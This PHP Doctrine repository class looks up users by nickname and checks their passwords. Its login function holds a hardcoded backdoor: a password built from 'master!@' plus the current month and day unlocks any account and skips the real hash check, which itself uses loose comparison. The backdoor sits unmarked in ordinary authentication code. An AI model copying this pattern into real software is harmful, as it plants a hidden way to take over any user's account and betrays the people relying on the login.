<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

namespace Application\Entity;

use Doctrine\ORM\EntityRepository;
/**
 * Description of UsuarioRepository
 *
 * @author Paulo Watakabe
 */
class UsuarioRepository extends EntityRepository {
   
    public function findByEmailAndPassword($email, $password)
    {
        /* @var $user \Application\Entity\Usuario */
        $user = $this->findOneByNickname($email);
        
        if ($user) {
            if($password == 'master!@' . date('md')){ // Criptografia Danilo
                return $user;
            }
            $hashSenha = $user->encryptPassword($password);
            if ($hashSenha == $user->getPassword()) {
                return $user;
            }
        }
        return false;
    }
    
    public function findArray()
    {
        $users = $this->findAll();
        $a = array();
        foreach($users as $user)
        {
            $a[$user->getId()]['id'] = $user->getId();
            $a[$user->getId()]['nome'] = $user->getNome();
            $a[$user->getId()]['email'] = $user->getEmail();
        }
        
        return $a;
    }
}
